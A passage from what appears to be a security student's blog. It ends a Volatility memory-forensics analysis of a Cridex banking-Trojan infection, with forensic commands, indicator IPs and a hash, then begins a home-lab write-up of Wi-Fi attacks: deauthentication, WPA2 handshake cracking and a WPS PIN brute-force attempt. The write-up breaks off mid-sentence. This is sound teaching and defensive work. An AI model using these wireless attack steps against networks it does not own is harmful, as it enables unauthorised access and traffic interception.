be used toconnect with Command and Control(C2) servers.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem dlllist|grep comctl32.dll</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_dlllist_grep.png" class=""><p>If we search comctl32.dll from dll list, we can find that many processeswere infected by this evil dll, which could allow attackers control thiscomputer from remote addresses.</p><h3 id="Detection-and-Mitigation"><a href="#Detection-and-Mitigation" class="headerlink" title="Detection and Mitigation"></a>Detection and Mitigation</h3><p>Based on the MITRE ATT&amp;CK Navigator,the progress of trojan attack contains several steps, such as: InitialAccess, Execution, Persistence, Privilege Escalation, Command andControl (C2) and Data Exfiltration. In this task, we mainly focus on thefirst two stages: Initial Access and Execution.</p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/ATTACK.png" class=""><p><strong>(1) Initial Access:</strong></p><p>There are several methods that can gain the initial access of asystem,such as phishing attack and valid accounts, we will talk aboutsome detection and mitigation methods below:</p><p><strong>1. Phishing attack</strong></p><p>Phishing attack is the most common attack methodused in initial access. We can use the following method to preventPhishing:</p><p>a. Email filtering and anti-phishing protection: Before emails arereceived, security email gateway will filtrate some suspicious emails.If users open the attachment file, file will be scaned and open in thesandbox environment to protect the local PC.</p><p>b. Network Attack Defense: If users’ PC connect to IP or URL, thesecurity of IP or URL will be detected as IoC. If the IP or URL aresigned evil or malicious, connection will be stopped.</p><p>c. Security training and report mechanism: Every employees in thecompany should be trained regularly to have the awareness of emailsecurity, which could stop them from opening the malicious emails andthen report this events to the security engineer.</p><p><strong>2.Valid accounts:</strong></p><p>Attackers always try to collect valid accounts from internal or outsideand try to gain access privileges, we can use strategies relatedaccounts to detect and mitigate this kind of attack.</p><p>a.Account abnormal monitoring: Monitor the behaviors of users’ accountsand try to find some abnormal login behaviors such as login from auncommon IP address.</p><p>b.Multi-Factor Authentication(MFA): Any uncommon login behavior will bedouble checked.</p><p><strong>(2)Execution:</strong></p><p>There are some common ways that can be used to execute the maliciousprogram, such as user excution, scheduled tasks, processinjection and so on, we will talk about detection andmitigation methods below:</p><p><strong>1. Anti-Virus(AV) defender:</strong></p><p>AV can detect the known malware file based on the IoC such as file hash.If evil files are downloaded or executed, they will be detected by AVengine.</p><p><strong>2. Endpoint Detection and Response(EDR):</strong></p><p>EDR can detect malicious behaviors such as process injection, processhijacking, service creating, network connection and file access, notjust depend on the static characteristics.</p><p><strong>3. Network Attack Defense:</strong></p><p>If users’ PC connect to IP or URL, the security of IP or URL will bedetected as IoC.If the IP or URL are signed evil or malicious,connection will be stopped.</p><h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><h3 id="SIDs-Check"><a href="#SIDs-Check" class="headerlink" title="SIDs Check"></a>SIDs Check</h3><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.getsids.GetSIDs</code></pre><p>We use windows.getsids.GetSIDs plugins to find Security Identifiers(SIDs), we find that there is a user called Robert who can start asystem process wuauclt.exe(PID 1588), which is noticeable. Firstly, Ifthis Robert is not a nomoral user, it may be created by hacker and usedto do something evil. Besides, a system process that can be executed bya user account means that this process is a disguised as evil process.</p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_sids.png" class=""><p>We filtrate the processes that can be executed by Administrators group.We can see the result from the figure below, which shows that most ofthem are system processes except reader_sl.exe and wuauclt.exe(PID1588). This is exactly the suspicious processes that we analyse earlier,if they can be executed by the account that has administratorprivileges, it can be used to elevate the privileges.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.getsids.GetSIDs | grep Administrators </code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_sids_grep.png" class=""><h3 id="Privileges-Check"><a href="#Privileges-Check" class="headerlink" title="Privileges Check"></a>Privileges Check</h3><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.privilege | egrep -i &quot;1640|1588&quot; </code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_priv_grep.png" class=""><p>We use windows.privilege plugin to detect the privileges of the programand find some suspicious points that reader_sl.exe has extramely highpermissions such as SeDebugPrivilege, SeTakeOwnershipPrivilege,SeImpersonatePrivilege and so forth, which do not belong to a normaluser progam. The wuauclt.exe is the same. From the analysis, we can getthe conclusion that some processes have been used to elevate privileges.</p><h3 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h3><p>In this section, we will check the environment variables of theprocesses to find some potential abnormal paths.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.envars.Envars | egrep -i &quot;Path|HOMEPATH&quot;</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_envars_grep_HOME.png" class=""><p>We find that wuauclt.exe is a system process, but wuauclt.exe(PID 1588)has an environment variable called HOMEPATH which means that it is auser process. This confilication indicate that this process is likely amalicious software disguised process.</p><p>We filtrate the TEMP folder, which always used by malicious software todownload or store some file.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.envars.Envars | egrep -i &quot;TEMP&quot;</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_envars_grep_TEMP.png" class=""><p>We also find that the system process wuauclt.exe(PID 1588) used thelocal user temp folder, which once again confirms the judegment before.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.handles --pid 1588</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_handles.png" class=""><p>We can check the handles of the PID 1588, and found that it has beeninjected by the C2 dll.</p><h3 id="Detection-and-Mitigation-1"><a href="#Detection-and-Mitigation-1" class="headerlink" title="Detection and Mitigation"></a>Detection and Mitigation</h3><p>In this task, we mainly focus on the next stage: PrivilegeEscalation. There are four common methods thatcan be used to elevate the privileges: credential exploitation,vulnerabilities and exploits, misconfigurations and malware, and we willtalk about some detection and mitigation ways below:</p><p><strong>(1) Credential exploitation:</strong></p><p>Multi-Factors Authentication(MFA): Attackers always try to collectand use some system account to pass the authentication. So we may findsome attempt records in system logs. If we use the MFA, system will askuser for further information to verify the identification, which is astrong way to stop attackers from gaining access to the system.:::</p><p><strong>(2)Vulnerabilities and exploits:</strong></p><p>Update and Patch the system on time: Make sure that the system issecure and do not have any known vulnerability, which can make it moredifficult for attackers to escalate privileges by exploiting knownvulnerabilities.:::</p><p><strong>(3)misconfigurations:</strong></p><ol><li><p>Strictly manage changes to accounts and configurations: Real-timemonitoring and event log analysis can detect the changes of the accountsand configurations. IF abnormal changes occur, the alarm will betriggered.:::</p></li><li><p>Least privileges: Make sure any account can only get theprivileges that it needs.:::</p></li></ol><p><strong>(4)Malware:</strong></p><ol><li><p>Comprehensive log analysis: Use Security Information and EventManagement(SIEM) to collect and analyse many kinds of log informationgenerated from the system, such as firewall, network equipment andservers, which can find some evil behaviors like privilege escalation.:::</p></li><li><p>Processes monitoring and isolation: Monitoring the processes,which belongs to system or have high privileges, if there are systemprocesses that have the same name or some abnormal privilegesmodification, these processes will be isolated to stop them from furtherexploiting.:::</p></li></ol><h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><h3 id="Malware-Detection"><a href="#Malware-Detection" class="headerlink" title="Malware Detection"></a>Malware Detection</h3><p>We used windows.malfind plugin to detect processes that contain segmentshaving the privilege &quot;PAGE_EXECUTE_READWRITE&quot;, which is the skill thatcommonly used by malicious programs to modify and execute codedynamically.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.malfind | grep &quot;PAGE_EXECUTE_READWRITE&quot;</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_malfind.png" class=""><p>From the figure above we can see, process explorer.exe and reader_sl.execontain MZ header, which means that Windows executable program hidden inthese two processes. This is a obvious sign that processes have beeninjected by malicious code.</p><h3 id="Registry-Persistence-Analysis"><a href="#Registry-Persistence-Analysis" class="headerlink" title="Registry Persistence Analysis"></a>Registry Persistence Analysis</h3><p>In this section, we will check the common registry key always used bymalicious processes to persist privileges.</p><p><code> python3 vol.py -f infected-system.vmem windows.registry.printkey --key &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</code></p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_printkey_run.png" class=""><p>Using the plugin windows.registry.printkey and filtrate the&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; key, we can findthat there is a last change that set KB00207077.exe in auto-start path.This is definitely not a normal program and should be a maliciousexecutable file. When system start up, this executable file can beexecuted, which can make sure its persistence.</p><p><code> python3 vol.py -f infected-system.vmem windows.registry.printkey --key &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer&quot;</code></p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_printkey_explorer.png" class=""><p>By searching the key&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer&quot; we can findthat there are some hook points in web-find and file-find. These areabnormal behaviors, which are always used to hijack users’ normalactions. When users search for something in the browser or in filesystem, malicious code can be triggered.</p><h3 id="Command-Records"><a href="#Command-Records" class="headerlink" title="Command Records"></a>Command Records</h3><p>Plugin windows.cmdline can be used to analyse the process command tofind some abnormal behaviors.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.cmdline</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_cmdline.png" class=""><p>We could see that process wuauclt.exe(PID 1136) use the&#x2F;RunStoreAsComServer command and follows a file as parameter which nameis hash format. This is abnormal and is probably a some kind ofinjection and persistence behavior.</p><h3 id="Persistence-Mechanism-Identification"><a href="#Persistence-Mechanism-Identification" class="headerlink" title="Persistence Mechanism Identification"></a>Persistence Mechanism Identification</h3><p>In this section we will discuss persistence technologies, which is asiginficant way for attackers to gain the control of the systempersistently. The common ways of persistence include:accounts creation, scheduled tasks, services&#x2F;drivers masquerading,processes injection, registry modification and so on.</p><p><strong>(1)Accounts creation:</strong></p><p>1. Regularly check for additions and modifications to accounts andaccount groups, identify the evil changes.</p><p>2. Follow least privilege principle to restrict the privilege that canmodify or create accounts.</p><p>3. MFA: Using MFA to stop attacker from using collect accountsinformation continuously.</p><p>4. Remove inactive account: Removing dormant accounts regularly canreduce account exploitation.</p><p><strong>(2)Scheduled tasks and registry modification:</strong></p><p>1. Monitoring the creation and modification of the scheduled tasks andregistry.Stop any unauthorized access.</p><p>2. Use SIEM to collect and analyse corresponding logs, if anythingabnormal occur, triggers the alarm.</p><p><strong>(3)Services&#x2F;drivers masquerading:</strong></p><p>1. Check services&#x2F;drivers list reguarly to find unsigned or unknownservices&#x2F;drivers</p><p>2. Implement a mandatory signature mechanism and control the creationpermission strictly.</p><p><strong>(4)Processes injection:</strong></p><p>1. EDR monitor: Use EDR to detect the abnormal behaviors of processeslike injection, connecting to known IP or URL.</p><h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><h3 id="User-Activities-Tracking"><a href="#User-Activities-Tracking" class="headerlink" title="User Activities Tracking"></a>User Activities Tracking</h3><p>We use the windows.registry.userassist plugin to show the executionrecords in the Windows GUI.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.registry.userassist | grep UEME_RUNPATH</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_userassist.png" class=""><p>We can clear see that WinScp.exe was executed, which is a file transfertools probably used to download some evil file from remote evil server.Besides, the executable file called cridex1.exe was executed finally,which is a classic Trojan file.</p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/cridex1.png" class=""><h3 id="Hidden-Processes"><a href="#Hidden-Processes" class="headerlink" title="Hidden Processes"></a>Hidden Processes</h3><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.psxview</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_psxview.png" class=""><p>According to the investigation we did before, we can find two maliciousprograms: cridex1.exe and KB00207077.exe, but we can not find them whenwe use the pslist or psscan plugin, so maybe they were hidden , and wewill try to find them from the memory dump.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.filescan | egrep -i &quot;cridex|KB&quot;</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_filescan.png" class=""><p>Now, try to dump this file from the memory and make sure what thefunction is.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.dumpfiles --physaddr 0x238c778    python3 vol.py -f infected-system.vmem windows.dumpfiles --physaddr 0x2410c78    python3 vol.py -f infected-system.vmem windows.dumpfiles --physaddr 0x24abd80</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_dumpfiles1.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_dumpfiles2.png" class=""><p>Then, we use sha256sum to generate the hash, and search them in Virustotal</p><pre><code class="hljs">sha256sum file.0x2410c78.0x821ebea8.DataSectionObject.KB00207877.exe.dat</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_sha256.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/virustotals_file.png" class=""><p>We can see that this file is exactly malicious and is identified asCridex, which is a classic bank Trojan, same as what we found in thesection above. Besides, in the above section, we tried to usewindows.malfind plugin and found explorer.exe, reader_sl.exe has beeninjected in a Windows executable file segment, which is a common methodthat a evil process hide itself.</p><h3 id="Search-Strings"><a href="#Search-Strings" class="headerlink" title="Search Strings"></a>Search Strings</h3><p>We choose the process of explorer.exe, reader_sl.exe and wuauclt.exe asthe objects of our analysis.</p><pre><code class="hljs">python3 vol.py -f infected-system.vmem windows.memmap --pid 1484 --dump    python3 vol.py -f infected-system.vmem windows.memmap --pid 1640 --dump    python3 vol.py -f infected-system.vmem windows.memmap --pid 1588 --dump</code></pre><p>We use strings command combined with egrep command to filtrate somesuspicious strings from dump files.</p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_strings_KB.png" class=""><p>We can find from the result that these three processes all related tothe evil KB00207877.exe, so they are all infected or injected.</p><p>Now, we will try to combine these three dumps together and use stringscommand to find some suspicious strings.</p><pre><code class="hljs">strings pid.1640.dmp pid.1484.dmp pid.1588.dmp &gt; suspicious.dmp</code></pre><p>We try to grep string ‘.com’ and find that there are lots of stringsrelated to banks, which means that this Trojan targets banks forattacks.</p><pre><code class="hljs">strings suspicious.dmp | grep &#39;.com&#39;| sort -u</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_bank.png" class=""><p>We also search the keyword &quot;password&quot;, and the result shows that thisTrojan tries to pretend a page of receiving PIN code.</p><pre><code class="hljs">strings suspicious.dmp | grep &#39;password&#39;| sort -u</code></pre><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_grep_password.png" class=""><p>IP address is another important information that can show the address towhich the Trojan connects.</p><p><code> strings suspicious.dmp | grep -P -o &#39;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#39; | sort | uniq</code></p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/windows_grep_ip.png" class=""><p><code> ...    125.19.103.198    ...    188.40.0.138    190.81.107.70    ...    210.56.23.100    211.44.250.173    ...    239.255.255.250    41.168.5.140    ...    85.214.204.32</code></p><h3 id="Cross-reference-Analysis"><a href="#Cross-reference-Analysis" class="headerlink" title="Cross-reference Analysis"></a>Cross-reference Analysis</h3><p>In this section ,we will use two Threat intelligence platform to checkthe IP address(IoC) collected from the evil programs to confirm the typeof the malware.</p><p><strong>Virus Total</strong></p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/125.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/188.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/190.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/210.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/211.png" class=""><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/41.png" class=""><p>**AlienVault OTX **</p><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/85.png" class="AlienVault OTX"><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/41.png" class="AlienVault OTX"><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/210.png" class="AlienVault OTX"><img src="/2025/04/30/Cridex-Trojan-Infection-System-Forensic-Analysis/211.png" class="AlienVault OTX"><p>From the results above, we can find that these IP all as Trojan agentand associated with Cridex Trojan.</p><h3 id="Real-Impacts"><a href="#Real-Impacts" class="headerlink" title="Real Impacts"></a>Real Impacts</h3><p>Cridex is a quite famous Trojan targeting banks,which was spread widely via spam emails. Once Cridex was planted on aPC, it waited for users to log in to their online banking site andinjected code onto the site to switch in a login form connected to theattackers’ servers. From there, the hackers stole usernames andpasswords and then people’s money.</p><p>The UK has been one of the biggest targets of the Cridex, with as muchas £20 million ($30 million) lost. The FBI said at least $10 millionin direct loss domestically could be attributed to Cridex. Given nearly30 countries were targeted, the likely intake of Cridex is beyond $50million.</p><h3 id="IoC-Input-and-Output-Table"><a href="#IoC-Input-and-Output-Table" class="headerlink" title="IoC Input and Output Table"></a>IoC Input and Output Table</h3><table><thead><tr><th>IoC</th><th>Virus Total</th><th>AlienVault OTX</th></tr></thead><tbody><tr><td>125.19.103.198</td><td>4&#x2F;94 malicious</td><td>Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>188.40.0.138</td><td>2&#x2F;94 malicious</td><td>Unknown</td></tr><tr><td>190.81.107.70</td><td>3&#x2F;94 malicious</td><td>Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>210.56.23.100</td><td>9&#x2F;94 malicious</td><td>Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>211.44.250.173</td><td>8&#x2F;94 malicious</td><td>Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>239.255.255.250</td><td>a CnC by ENEMYBOT</td><td>Unknown</td></tr><tr><td>41.168.5.140</td><td>6&#x2F;94 malicious</td><td>Unix.Trojan.Mirai-7640640-0, Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>85.214.204.32</td><td>4&#x2F;94 malicious</td><td>Worm:Win32&#x2F;Cridex.E</td></tr><tr><td>f705f59d53d578e<br>c14b5220fecf75a<br>27b5792b22535bd<br>0001127e93ac7a11352</td><td>PEEXE 55&#x2F;65 malicious<br>Win32:Cridex-N</td><td>Unknown</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>Table  : Indicators of Compromise (IoC) comparison</p><h3 id="IoC-Identification-and-Mitigation"><a href="#IoC-Identification-and-Mitigation" class="headerlink" title="IoC Identification and Mitigation"></a>IoC Identification and Mitigation</h3><p>An Indicator of Compromise (IOC) is a pieceof forensic data that suggests an information security system may havebeen breached. IoC commomly contains several types:</p><p><strong>1. IP Addresses:</strong></p><p>a. Unusual outbound communication to known malicious IPs canindicate a compromised system.</p><p>b. Monitoring for unexpected network traffic is an significantmethod of identifying potential breaches.</p><p><strong>2. Domain Names and URLs:</strong></p><p>a. Access to suspicious or malicious domains&#x2F;URLs may indicate a C2connection and distribution attempts</p><p>b. Combine the white list and black list to restrict the outboundconnection to domain</p><p><strong>3. File Hashes:</strong></p><p>a. Unique hashes for files can help detect the existence of knownmalware or other malicious programs.</p><p>b. Regularly updating hash databases with newly discovered threatsensures that organizations have the most up-to-date information toprotect their systems.</p><p><strong>4. Email Addresses:</strong></p><p>a. Used in phishing attacks, suspicious email addresses can be avaluable IoC for identifying potential breaches.</p><p>b. Use security email gateway to detect and filtrate the suspiciousemails</p><p>c. Train employee to have the awareness of identify the phishingemails to protect themselves.</p><p><strong>5. Registry Keys:</strong></p><p>a. Unusual changes to registry keys can be a sign of systemcompromise.</p><p>b. Use EDR or SIEM to monitor the unexpected modifications tocritical system settings can help detect and respond to potentialthreats quickly.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This report analyses an image infected with the Cridex Trojan, which isnotorious malware targeting banks for attacks. From Task 1-4, we mainlyfocus on several attack stages such as: Initial access, Execute,Privileges Escalation and Persistence. During the analysis, we know thatCridex Trojan can siphon users’ bank accounts and PINs by hijacking thewebpage of payment and persist itself by modifying the registry andprocesses injection. Besides, it may turn infected PCs into part of abotnet.</p><p>Through the analysis of the malware text content, we found several IoCsand confirmed their malicious intent by searching them from Virus totaland AlienVault OTX. Moreover, within each task, we also discussed somedetection and mitigation mechanisms of these attack stages.</p><p>Static analysis is an another strong technique that can help us analysemalware combined with memory analysis, which can show the specific logicand control flow of the code. We could know how malware get theadministrator privilege or how they inject other processes. In thisreport, we do not contain this part, but i really want to practisestatic analysis in the future.</p>]]></content>
    
    
    <categories>
      
      <category>取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireless security vulnerability exploit</title>
    <link href="/2025/04/25/Wireless-security-vulnerability-exploit/"/>
    <url>/2025/04/25/Wireless-security-vulnerability-exploit/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a><strong>1.Introduction</strong></h1><p>Wireless network has become a crucial part on lives of everyone. Whenpeople go to restaurants, markets or coffee shops, they always want toconnect to the WI-FI, even if that is an open WI-FI, which means thatthis kind of WI-FI does not need to enter passwords.</p><p>That is a big problem, because many dangers are hiding behind WI-FI.Attackers may leverage the flaws in WI-FI protocol or human weaknessesto steal sensitive information during you surfing the internet.</p><p>This report mainly focuses on the experiments of the classic wirelessattack and consists of the following parts: <strong>Environment setting,Attack principle, Attack processes</strong> and the corresponding <strong>mitigationmeasures</strong>.</p><p>In this experiment, I use a raspberry to simulate a victim and use kalivirtual machine in my laptop with an external wireless network adapteras the attacker endpoint. The whole WI-FI network is created by myrouter.</p><p>Laptop, raspberry connect to the WI-FI, and raspberry use ethernet cableto connect to the router. The network architecture shows as followingpicture:</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image2.png" class=""><p>Router gateway: <strong>192.168.88.1</strong></p><p>Raspberry: <strong>192.168.88.184(wlan0), 192.168.88.188(eth0)</strong></p><h1 id="2-Environment-setting"><a href="#2-Environment-setting" class="headerlink" title="2.Environment setting"></a><strong>2.Environment setting</strong></h1><h2 id="2-1-Router-resetting"><a href="#2-1-Router-resetting" class="headerlink" title="2.1 Router resetting"></a><strong>2.1 Router resetting</strong></h2><p>At the beginning, I met some problems during using my router. I couldnot get the right Ip address of this router, and the default Ip addresswas 169.254.xxx.xxx, which meat that my router could not be assigned aIp address by the DHCP service.</p><p>I tried to reset the router, but nothing happened. I had no choice butto flash the router’s firmware and system. I found the official documentfrom the internet and did it by myself.</p><p>The following pictures show the method to use the tool called<strong>Netinstall</strong> to flash the router.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image3.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image4.png" class=""><p>The <strong>“Appy default config”</strong> option is quite important, and the flashcould not work if I miss this option.</p><blockquote><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image5.png" class=""></blockquote><p>Finally, I got the Ip address 192.168.88.1, and everything worked well.</p><h2 id="2-2-Raspberry-setting"><a href="#2-2-Raspberry-setting" class="headerlink" title="2.2 Raspberry setting"></a><strong>2.2 Raspberry setting</strong></h2><p>In this section, I will talk about the initial experiment environmentsetting. I changed the WI-FI’s name and password and then I needed toconfigure the raspberry to make it connect to the WI-FI of the router.</p><p>Firstly, I used ssh to login to the raspberry.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image6.png" class=""><p>When I checked the status of network connection using <strong>iwconfig</strong>command, I found that the default WI-FI connection is MSc-Cyber. So, Ineeded to disconnect it and reconnect it to the WI-FI of router.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image7.png" class=""><p>I used <strong>nmcli</strong> command to connect the raspberry to my own WI-FI.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image8.png" class=""><p>When I checked the connection, I found that the connection has beenbuilt and Ip address was 192.168.88.184.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image9.png" class=""><h1 id="3-Attack-implementation"><a href="#3-Attack-implementation" class="headerlink" title="3.Attack implementation"></a><strong>3.Attack implementation</strong></h1><p>In this section, I will describe 5 kinds of classic wireless attackswith detailed attack processes and corresponding mitigation measures.</p><p>The name of the attacks are:</p><ul><li><p><em><strong>Attacks against four-way handshake</strong></em></p></li><li><p><em><strong>Attacks against WPS</strong></em></p></li><li><p><em><strong>Attacks involving mac spoofing</strong></em></p></li><li><p><em><strong>Man in the middle attack</strong></em></p></li><li><p><em><strong>Network spoofing attacks (Evil Twin AP)</strong></em></p></li></ul><h2 id="3-1-Attacks-against-four-way-handshake"><a href="#3-1-Attacks-against-four-way-handshake" class="headerlink" title="3.1 Attacks against four-way handshake"></a><strong>3.1 Attacks against four-way handshake</strong></h2><h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle:"></a><strong>Principle:</strong></h3><p>To establish a connection between the client and the WI-FI network, afour-way handshake is required. This handshake process can be capturedusing Wireshark. During the handshake, random numbers and the MIC(Message Integrity Code) are exchanged. The MIC is computed using theWI-FI password, the random numbers, and the Wi-Fi name (SSID).Therefore, an attacker can use a password dictionary to perform anoffline brute-force attack. When the correct password is found, thecomputed MIC will match the one captured in the handshake data.</p><h3 id="Attack-process："><a href="#Attack-process：" class="headerlink" title="Attack process："></a><strong>Attack process：</strong></h3><p>I used the tool called <strong>Wifite</strong> to start the monitor mode of thewlan0.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image10.png" class=""><p>I used <strong>airodump-ng</strong> to monitor the BSSID of the Wi-Fi in the network.I found that BSSID of the <strong>“MitroTik-wenbo”</strong> is D4:01:C3:84:95:A1.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image11.png" class=""><p>If I want to attack a client, I need to know which clients wereconnected to this WI-FI, so I specified the BSSID and channel. Theresult as following picture, because we knew that the first mac addresswas my host machine, so the other one must the raspberry that I neededto attack.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image12.png" class=""><p>I used the <strong>airodump-ng</strong> to record the network flows and wrote them tothe PCAP file.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image13.png" class=""><p>Next step, I needed to make victim reconnect the WI-FI and tried to useWireshark so I used <strong>aireplay-ng</strong> to send the deauthenticationpackets.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image14.png" class=""><p>After the packets was sent, I could see the raspberry lost theconnection with the WI-FI “<strong>MikroTik-wenbo”.</strong></p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image15.png" class=""><p>Now, reconnected this WI-FI and saw four-way handshake records in theWireshark.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image16.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image17.png" class=""><p>For gaining the password of the WI-FI, I used the tool called<strong>aircrack-ng</strong> to crack the password, which used the password book inthe kali.</p><p>I set the password to a simple “password”, which was quite weak and easyto be cracked, so it did not cost too much time.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image18.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image19.png" class=""><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation:"></a><strong>Mitigation:</strong></h3><p><strong>1.Use stronger WI-FI password:</strong> Using stronger password is a simpleand effective way to enhance the security of your WI-FI. We need toavoid using easily guessable password, such as “password”. It isrecommended to use passwords including a mix of uppercase and lowercaseletters, special characters and numbers, ensuring the password length isbetween 8-12 characters, which can effectively increase the difficultyof password cracking.</p><p><strong>2.Use stronger WI-FI protocol:</strong> We can use the WPA3 protocol, whichuses more secure way of key exchange than WPA2 and can stop attackersfrom guessing the password by brute-force way.</p><h2 id="3-2-Attacks-against-WPS"><a href="#3-2-Attacks-against-WPS" class="headerlink" title="3.2 Attacks against WPS"></a><strong>3.2 Attacks against WPS</strong></h2><h3 id="Principle-1"><a href="#Principle-1" class="headerlink" title="Principle:"></a><strong>Principle:</strong></h3><p>WPS (Wi-Fi Protected Setup) attacks target the PIN method in WPSconnections. To simplify the connection process, WPS allows two methodsfor password-free connections: one method uses the client’s pairingbutton, and the other uses a PIN code. The PIN code is an 8-digitnumber, which is vulnerable to brute-force attacks. Because attackerscan just guess the top 7 numbers, and the last number can be calculatedby the top 7 numbers, the number of guesses that attackers need are lessthan 10000000, and also this PIN code can be divided into two parts, sothe actual time the guesses cost will be less.</p><h3 id="Attack-process：-1"><a href="#Attack-process：-1" class="headerlink" title="Attack process："></a><strong>Attack process：</strong></h3><p>WPS is a kind of router mode that can allow some devices connect to itwithout using PKS. So in this attack, I need to use the virtual buttonto start this kind of mode. I did not find any place to configure thePIN code, So I thought this router might not be attacked by this way.</p><blockquote><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image20.png" class=""></blockquote><p>I used <strong>airodump-ng</strong> to check the WPS status of the network devices.As you can see the result column from the picture below: WPS status ofthe <strong>“MikroTik-wenbo”</strong> was not locked and the version was 1.0.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image21.png" class=""><p>I tried to use the tool called <strong>reaver</strong> to brute forced the WPS PINcode, but as the picture shows below, I found that the requests havetimed out, which might 